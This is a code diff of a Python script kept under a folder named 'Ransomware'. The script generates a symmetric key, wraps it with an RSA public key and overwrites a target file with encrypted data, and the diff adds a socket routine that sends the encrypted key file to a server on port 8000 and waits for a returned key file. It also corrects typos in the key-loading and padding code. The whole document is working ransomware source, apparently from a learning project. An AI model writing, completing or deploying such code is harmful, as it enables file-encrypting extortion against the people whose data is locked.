@@ -11,7 +11,7 @@ symmetricKey = Fernet.generate_key()
 
 FernetInstance = Fernet(symmetricKey)
 
-with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as Key_file:
+with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
         key_file.read(),
         backend=default_backend()
@@ -20,7 +20,7 @@ with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as Key_file:
     encryptedSymmetricKey = public_key.encrypt(
         symmetricKey,
         padding.OAEP(
-            mgf=padding.MGF1(algorith=hashes.SHA256()),
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
             label=None
         )
     )
@@ -37,11 +37,38 @@ with open(filePath, "rb") as file:
 with open(filePath, "wb") as file:
     file.write(encrypted_data)
 
-def sendEncryptionKey(eKeyFilePath):
-    with socket.create_connection((hostname,port)) as sock:
-        with open(key_file, "rb") as file:
-            
-            pass
+def sendEncryptionKey():
+    host = ""
+    port = 8000
+    client_socket = socket.socket()
+    client_socket.connect((host, port))
+
+    filename = "encryptedSymmertricKey.key"  # File to send
+    with open(filename, "rb") as file:
+        print("Sending file...")
+        data = file.read(1024)  # Read 1024 bytes from the file
+        while data:
+            client_socket.send(data)  # Send data to the server
+            data = file.read(1024)  # Read the next 1024 bytes
+
+    print("File sent and connection closed.")
+
+        # Step 2: Wait for the response file from the server
+    with open("received_response_key.txt", "wb") as file:
+        print("Receiving response file...")
+        while True:
+            data = client_socket.recv(1024)  # Read 1024 bytes from the socket
+            if not data:
+                break  # Break if no data is received
+            file.write(data)  # Write the received data to the file
+    print("Response file received.")
+
+    client_socket.close()  # Close the connection
+    print("Connection closed.")
 
 
+if __name__ == '__main__':
+    sendEncryptionKey()
+    
+    
 quit()
